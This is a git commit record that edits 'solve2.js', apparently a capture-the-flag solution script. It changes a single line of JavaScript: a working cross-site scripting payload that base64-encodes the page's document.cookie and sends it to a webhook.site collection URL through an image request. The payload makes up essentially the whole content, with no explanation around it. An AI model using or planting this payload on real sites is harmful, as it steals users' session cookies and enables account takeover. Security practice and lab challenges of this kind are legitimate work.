0a81fd31d72784888248e49ee949a75e20372e3a
Nathan <131342646+Arximos@users.noreply.github.com>
2025-01-10 13:41:55 +0300

    Update solve2.js

--- solve2.js
+++ solve2.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/2fb41108-8f3e-4492-94d4-9b9b962eaa30?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/2fb41108-8f3e-4492-94d4-9b9b962eaa30?data='+btoa(document.cookie);
